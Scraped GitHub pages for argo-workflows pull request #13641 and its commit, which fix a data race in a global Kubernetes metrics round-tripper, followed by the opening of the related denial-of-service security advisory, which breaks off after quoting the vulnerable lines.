=== Content from github.com_bede7a4d_20250114_182201.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fargoproj%2Fargo-workflows%2Fpull%2F13641)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fargoproj%2Fargo-workflows%2Fpull%2F13641)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=argoproj%2Fargo-workflows)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[argoproj](/argoproj)
/
**[argo-workflows](/argoproj/argo-workflows)**
Public

* [Notifications](/login?return_to=%2Fargoproj%2Fargo-workflows) You must be signed in to change notification settings
* [Fork
  3.2k](/login?return_to=%2Fargoproj%2Fargo-workflows)
* [Star
   15.3k](/login?return_to=%2Fargoproj%2Fargo-workflows)

* [Code](/argoproj/argo-workflows)
* [Issues
  981](/argoproj/argo-workflows/issues)
* [Pull requests
  139](/argoproj/argo-workflows/pulls)
* [Discussions](/argoproj/argo-workflows/discussions)
* [Actions](/argoproj/argo-workflows/actions)
* [Projects
  1](/argoproj/argo-workflows/projects)
* [Security](/argoproj/argo-workflows/security)
* [Insights](/argoproj/argo-workflows/pulse)

Additional navigation options

* [Code](/argoproj/argo-workflows)
* [Issues](/argoproj/argo-workflows/issues)
* [Pull requests](/argoproj/argo-workflows/pulls)
* [Discussions](/argoproj/argo-workflows/discussions)
* [Actions](/argoproj/argo-workflows/actions)
* [Projects](/argoproj/argo-workflows/projects)
* [Security](/argoproj/argo-workflows/security)
* [Insights](/argoproj/argo-workflows/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fargoproj%2Fargo-workflows%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fargoproj%2Fargo-workflows%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# fix: Prevent data race from global metrics round-tripper #13641

 Merged

[Joibel](/Joibel)
merged 1 commit into
[argoproj:main](/argoproj/argo-workflows/tree/main "argoproj/argo-workflows:main")
from
[meln5674:bugfix/metrics-rt-data-race](/meln5674/argo-workflows/tree/bugfix/metrics-rt-data-race "meln5674/argo-workflows:bugfix/metrics-rt-data-race")

Sep 23, 2024

 Merged

# [fix: Prevent data race from global metrics round-tripper](#top) #13641

[Joibel](/Joibel)
merged 1 commit into
[argoproj:main](/argoproj/argo-workflows/tree/main "argoproj/argo-workflows:main")
from
[meln5674:bugfix/metrics-rt-data-race](/meln5674/argo-workflows/tree/bugfix/metrics-rt-data-race "meln5674/argo-workflows:bugfix/metrics-rt-data-race")

Sep 23, 2024

[Conversation
5](/argoproj/argo-workflows/pull/13641)
[Commits
1](/argoproj/argo-workflows/pull/13641/commits)
[Checks
28](/argoproj/argo-workflows/pull/13641/checks)
[Files changed](/argoproj/argo-workflows/pull/13641/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![meln5674](https://avatars.githubusercontent.com/u/23241527?s=60&v=4)](/meln5674)

Copy link

Contributor

### @meln5674 **[meln5674](/meln5674)** commented [Sep 21, 2024](#issue-2540456018) ‚Ä¢ edited Loading

Fixes [#13637](https://github.com/argoproj/argo-workflows/issues/13637)

### Motivation

[This line](https://github.com/argoproj/argo-workflows/blob/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow/metrics/metrics_k8s_request.go#L75) introduces a data race by globally storing a round-tripper used by the kubernetes client. If a new request starts before the first one completes, and the first request attempts to use the same round-tripper it originally created before the second finishes upgrading its connection, it will result in a panic due to a nil `net.Conn` in the underlying SPDY implementation. As a result, if the controller makes too many new connections to the API server in a short-enough period of time, it will crash and restart.

While it is sensible to store a global handle to the metrics that this round-tripper records, storing the round-tripper itself is not.

### Modifications

This patch retains the "context" of the metrics (i.e. the actual `ctx` value, plus the handle to the metrics themselves) as global, but scopes the round-tripper to each connection by refactoring the context to its own type and global variable, and uses an embedded pointer to it in the round-tripper implementation to avoid needing downstream changes.

### Verification

E2E functional tests were run locally. Additionally, the PR tests identified in the issue as failing as a result of this race now pass, and the controller logs from running without the race detector were visually inspected to confirm that no panics occurred after multiple re-runs of the originally failing test.

Sorry, something went wrong.

All reactions

[![@meln5674](https://avatars.githubusercontent.com/u/23241527?s=40&v=4)](/meln5674)

`[fix: Prevent data race from global metrics round-tripper](/argoproj/argo-workflows/pull/13641/commits/0a0ace9542a4c44dc27429d4d6a6f5fd87abc155 "fix: Prevent data race from global metrics round-tripper

Signed-off-by: Andrew Melnick <meln5674@kettering.edu>")`
 ‚Ä¶

`[0a0ace9](/argoproj/argo-workflows/pull/13641/commits/0a0ace9542a4c44dc27429d4d6a6f5fd87abc155)`

```
Signed-off-by: Andrew Melnick <meln5674@kettering.edu>
```

[![@meln5674](https://avatars.githubusercontent.com/u/23241527?s=80&v=4)](/meln5674)

Copy link

Contributor

Author

### **[meln5674](/meln5674)** commented [Sep 21, 2024](#issuecomment-2365299980)

| Can anyone comment on [this test failure](https://github.com/argoproj/argo-workflows/actions/runs/10974775444/job/30473708609?pr=13641#step:16:12084)? Why is it expecting 404? That metric seems to be reporting healthily [here](https://github.com/argoproj/argo-workflows/actions/runs/10974775444/job/30473708609?pr=13641#step:16:5502). Was this maybe a hack added to work around something related to this same issue? |
| --- |

All reactions

Sorry, something went wrong.

[![@Joibel](https://avatars.githubusercontent.com/u/1827156?s=80&u=291f3cadb9046c4264fdf3327c777e3cb2c06e17&v=4)](/Joibel)

Copy link

Member

### **[Joibel](/Joibel)** commented [Sep 21, 2024](#issuecomment-2365311339)

| I believe this is a flakey test that does just sometimes fail. I don't remember introducing it when the roundtripper was added. I've kicked it to run again.  Anyway, that's for finding this and testing the RC. I will take a proper look when I have access to a proper computer. |
| --- |

 üëç
1
 agilgur5 reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@meln5674](https://avatars.githubusercontent.com/u/23241527?s=80&v=4)](/meln5674)

Copy link

Contributor

Author

### **[meln5674](/meln5674)** commented [Sep 21, 2024](#issuecomment-2365328985) ‚Ä¢ edited Loading

| Regarding the `test-executor` failure, it looks like the executor image is going missing between sometime after its loaded at the start of the test, and it looks like the same thing is happening on a lot of recent runs of it. I've seen similar issues before in my own repo's actions when the runner is low on storage and kubelet tries to garbage collect images I need later in the test. You can mitigate this with the `imageGC{High,Low}ThresholdPercent` [kubelet config fields](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/), which are easy enough to set in KinD, but I've never done it in K3s. |
| --- |

 üëÄ
1
 agilgur5 reacted with eyes emoji

All reactions

* üëÄ
  1 reaction

Sorry, something went wrong.

[![agilgur5](https://avatars.githubusercontent.com/u/4970083?s=60&v=4)](/agilgur5)

**[agilgur5](/agilgur5)**
approved these changes
[Sep 21, 2024](#pullrequestreview-2319914795)

 [View reviewed changes](/argoproj/argo-workflows/pull/13641/files/0a0ace9542a4c44dc27429d4d6a6f5fd87abc155)

Copy link

### @agilgur5 **[agilgur5](/agilgur5)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Thanks for investigating and your detailed root cause analysis!

If you want to improve on anything else in the repo, like other data races, flakey tests (which are themselves sometimes due to races), race detecting tests, or anything else, that'd be great üôÇ

This LGTM but I'll defer to Alan for final approval and merge since he wrote this code recently

Sorry, something went wrong.

All reactions

[![@agilgur5](https://avatars.githubusercontent.com/u/4970083?s=40&u=355810fb13a9f872315e7a7b2fc71fcedea191cc&v=4)](/agilgur5)
[agilgur5](/agilgur5)
added
[area/controller](/argoproj/argo-workflows/labels/area/controller)
Controller issues, panics
[area/metrics](/argoproj/argo-workflows/labels/area/metrics)
labels
[Sep 21, 2024](#event-14350618465)

[![@agilgur5](https://avatars.githubusercontent.com/u/4970083?s=40&u=355810fb13a9f872315e7a7b2fc71fcedea191cc&v=4)](/agilgur5)
[agilgur5](/agilgur5)
added this to the [v3.6.0](/argoproj/argo-workflows/milestone/30) milestone
[Sep 21, 2024](#event-14350618534)

[![Joibel](https://avatars.githubusercontent.com/u/1827156?s=60&v=4)](/Joibel)

**[Joibel](/Joibel)**
approved these changes
[Sep 23, 2024](#pullrequestreview-2321314105)

 [View reviewed changes](/argoproj/argo-workflows/pull/13641/files/0a0ace9542a4c44dc27429d4d6a6f5fd87abc155)

Copy link

Member

### @Joibel **[Joibel](/Joibel)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Nice find, thank you for fixing it.

Sorry, something went wrong.

All reactions

[![@Joibel](https://avatars.githubusercontent.com/u/1827156?s=40&u=291f3cadb9046c4264fdf3327c777e3cb2c06e17&v=4)](/Joibel)
[Joibel](/Joibel)
enabled auto-merge (squash)
[September 23, 2024 07:29](#event-14358604224)

 Hide details
View details

[![@Joibel](https://avatars.githubusercontent.com/u/1827156?s=40&u=291f3cadb9046c4264fdf3327c777e3cb2c06e17&v=4)](/Joibel)
[Joibel](/Joibel)
merged commit [`5244064`](/argoproj/argo-workflows/commit/524406451f4dfa57bf3371fb85becdb56a2b309a)
into
argoproj:main

[Sep 23, 2024](https://github.com/argoproj/argo-workflows/pull/13641#event-14360270092)
29 checks passed

[![@GoVulnBot](https://avatars.githubusercontent.com/u/96493708?s=40&v=4)](/GoVulnBot)
[GoVulnBot](/GoVulnBot)
mentioned this pull request
[Oct 28, 2024](#ref-issue-2618996931)

[x/vulndb: potential Go vuln in github.com/argoproj/argo-workflows: CVE-2024-47827
golang/vulndb#3226](/golang/vulndb/issues/3226)

Closed

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fargoproj%2Fargo-workflows%2Fpull%2F13641)

Reviewers

[![@agilgur5](https://avatars.githubusercontent.com/u/4970083?s=40&v=4)](/agilgur5) [agilgur5](/agilgur5)

agilgur5 approved these changes

[![@Joibel](https://avatars.githubusercontent.com/u/1827156?s=40&v=4)](/Joibel) [Joibel](/Joibel)

Joibel approved these changes

Assignees

No one assigned

Labels

[area/controller](/argoproj/argo-workflows/labels/area/controller)
Controller issues, panics
[area/metrics](/argoproj/argo-workflows/labels/area/metrics)

Projects

None yet

Milestone

 [**v3.6.x patches**](/argoproj/argo-workflows/milestone/30 "v3.6.x patches")

Development

Successfully merging this pull request may close these issues.

 [3.6.0-rc1: Controller panics due to metrics round-tripper data race](https://github.com/argoproj/argo-workflows/issues/13637)

3 participants

[![@meln5674](https://avatars.githubusercontent.com/u/23241527?s=52&v=4)](/meln5674) [![@Joibel](https://avatars.githubusercontent.com/u/1827156?s=52&v=4)](/Joibel) [![@agilgur5](https://avatars.githubusercontent.com/u/4970083?s=52&v=4)](/agilgur5)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_6229f0df_20250114_182200.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fargoproj%2Fargo-workflows%2Fcommit%2F524406451f4dfa57bf3371fb85becdb56a2b309a)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fargoproj%2Fargo-workflows%2Fcommit%2F524406451f4dfa57bf3371fb85becdb56a2b309a)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=argoproj%2Fargo-workflows)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[argoproj](/argoproj)
/
**[argo-workflows](/argoproj/argo-workflows)**
Public

* [Notifications](/login?return_to=%2Fargoproj%2Fargo-workflows) You must be signed in to change notification settings
* [Fork
  3.2k](/login?return_to=%2Fargoproj%2Fargo-workflows)
* [Star
   15.3k](/login?return_to=%2Fargoproj%2Fargo-workflows)

* [Code](/argoproj/argo-workflows)
* [Issues
  981](/argoproj/argo-workflows/issues)
* [Pull requests
  139](/argoproj/argo-workflows/pulls)
* [Discussions](/argoproj/argo-workflows/discussions)
* [Actions](/argoproj/argo-workflows/actions)
* [Projects
  1](/argoproj/argo-workflows/projects)
* [Security](/argoproj/argo-workflows/security)
* [Insights](/argoproj/argo-workflows/pulse)

Additional navigation options

* [Code](/argoproj/argo-workflows)
* [Issues](/argoproj/argo-workflows/issues)
* [Pull requests](/argoproj/argo-workflows/pulls)
* [Discussions](/argoproj/argo-workflows/discussions)
* [Actions](/argoproj/argo-workflows/actions)
* [Projects](/argoproj/argo-workflows/projects)
* [Security](/argoproj/argo-workflows/security)
* [Insights](/argoproj/argo-workflows/pulse)

## Commit

[Permalink](/argoproj/argo-workflows/commit/524406451f4dfa57bf3371fb85becdb56a2b309a)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix: Prevent data race from global metrics round-tripper ([#13641](https://github.com/argoproj/argo-workflows/pull/13641))

[Browse files](/argoproj/argo-workflows/tree/524406451f4dfa57bf3371fb85becdb56a2b309a)
Browse the repository at this point in the history

```
Signed-off-by: Andrew Melnick <meln5674@kettering.edu>
```

* Loading branch information

[![@meln5674](https://avatars.githubusercontent.com/u/23241527?s=40&v=4)](/meln5674)

[meln5674](/argoproj/argo-workflows/commits?author=meln5674 "View all commits by meln5674")
authored
Sep 23, 2024

1 parent
[7b35b11](/argoproj/argo-workflows/commit/7b35b11882f55ad905ae43776e060f659b04baee)

commit 5244064

Showing
**1 changed file**
with
**8 additions**
and
**6 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

14 changes: 8 additions & 6 deletions

14
[workflow/metrics/metrics\_k8s\_request.go](#diff-1a9e6a73f8ed518d150a47abe2bf943a5888248bf8d5afa75cbf66f0b01c2855 "workflow/metrics/metrics_k8s_request.go")

Show comments

[View file](/argoproj/argo-workflows/blob/524406451f4dfa57bf3371fb85becdb56a2b309a/workflow/metrics/metrics_k8s_request.go)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -38,15 +38,19 @@ func addK8sRequests(\_ context.Context, m \*Metrics) error { |
|  |  | return err |
|  |  | } |
|  |  |  |
|  |  | type metricsRoundTripperContext struct { |
|  |  | ctx context.Context |
|  |  | metrics \*Metrics |
|  |  | } |
|  |  |  |
|  |  | type metricsRoundTripper struct { |
|  |  | ctx context.Context |
|  |  | \*metricsRoundTripperContext |
|  |  | roundTripper http.RoundTripper |
|  |  | metrics \*Metrics |
|  |  | } |
|  |  |  |
|  |  | // This is a messy global as we need to register as a roundtripper before |
|  |  | // we can instantiate metrics |
|  |  | var k8sMetrics metricsRoundTripper |
|  |  | var k8sMetrics metricsRoundTripperContext |
|  |  |  |
|  |  | func (m metricsRoundTripper) RoundTrip(r \*http.Request) (\*http.Response, error) { |
|  |  | startTime := time.Now() |
| Expand All | | @@ -71,9 +75,7 @@ func AddMetricsTransportWrapper(ctx context.Context, config \*rest.Config) \*rest. |
|  |  | if wrap != nil { |
|  |  | rt = wrap(rt) |
|  |  | } |
|  |  | k8sMetrics.ctx = ctx |
|  |  | k8sMetrics.roundTripper = rt |
|  |  | return &k8sMetrics |
|  |  | return &metricsRoundTripper{roundTripper: rt, metricsRoundTripperContext: &k8sMetrics} |
|  |  | } |
|  |  | return config |
|  |  | } |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `5244064`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fargoproj%2Fargo-workflows%2Fcommit%2F524406451f4dfa57bf3371fb85becdb56a2b309a) to comment.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_ce9bf874_20250114_182201.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fargoproj%2Fargo-workflows%2Fsecurity%2Fadvisories%2FGHSA-ghjw-32xw-ffwr)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fargoproj%2Fargo-workflows%2Fsecurity%2Fadvisories%2FGHSA-ghjw-32xw-ffwr)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=argoproj%2Fargo-workflows)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[argoproj](/argoproj)
/
**[argo-workflows](/argoproj/argo-workflows)**
Public

* [Notifications](/login?return_to=%2Fargoproj%2Fargo-workflows) You must be signed in to change notification settings
* [Fork
  3.2k](/login?return_to=%2Fargoproj%2Fargo-workflows)
* [Star
   15.3k](/login?return_to=%2Fargoproj%2Fargo-workflows)

* [Code](/argoproj/argo-workflows)
* [Issues
  981](/argoproj/argo-workflows/issues)
* [Pull requests
  139](/argoproj/argo-workflows/pulls)
* [Discussions](/argoproj/argo-workflows/discussions)
* [Actions](/argoproj/argo-workflows/actions)
* [Projects
  1](/argoproj/argo-workflows/projects)
* [Security](/argoproj/argo-workflows/security)
* [Insights](/argoproj/argo-workflows/pulse)

Additional navigation options

* [Code](/argoproj/argo-workflows)
* [Issues](/argoproj/argo-workflows/issues)
* [Pull requests](/argoproj/argo-workflows/pulls)
* [Discussions](/argoproj/argo-workflows/discussions)
* [Actions](/argoproj/argo-workflows/actions)
* [Projects](/argoproj/argo-workflows/projects)
* [Security](/argoproj/argo-workflows/security)
* [Insights](/argoproj/argo-workflows/pulse)

# Controller: Denial of Service via malicious daemon Workflows

Moderate

[terrytangyuan](/terrytangyuan)
published
GHSA-ghjw-32xw-ffwr
Oct 28, 2024

## Package

gomod

https://github.com/argoproj/argo-workflows
([Go](/advisories?query=ecosystem%3Ago))

## Affected versions

v3.6.0-rc1

## Patched versions

v3.6.0-rc2

## Description

### Summary

Due to a race condition in a global variable, the argo workflows controller can be made to crash on-command by any user with access to execute a workflow.

This was resolved by [#13641](https://github.com/argoproj/argo-workflows/pull/13641)

### Details

These two lines introduce a data race in the underlying SPDY implementation of the Kubernetes API client. If a second request is made before the first completes, it results in a panic due to a null pointer.

* [argo-workflows/workflow/metrics/metrics\_k8s\_request.go](https://github.com/argoproj/argo-workflows/blob/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow/metrics/metrics_k8s_request.go#L49)

  Line 49
  in
  [ce7f9bf](/argoproj/argo-workflows/commit/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f)

  |  | var k8sMetrics metricsRoundTripper |
  | --- | --- |
* [argo-workflows/workflow/metrics/metrics\_k8s\_request.go](https://github.com/argoproj/argo-workflows/blob/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow/metrics/metrics_k8s_request.go#L75)

  Line 75
  in
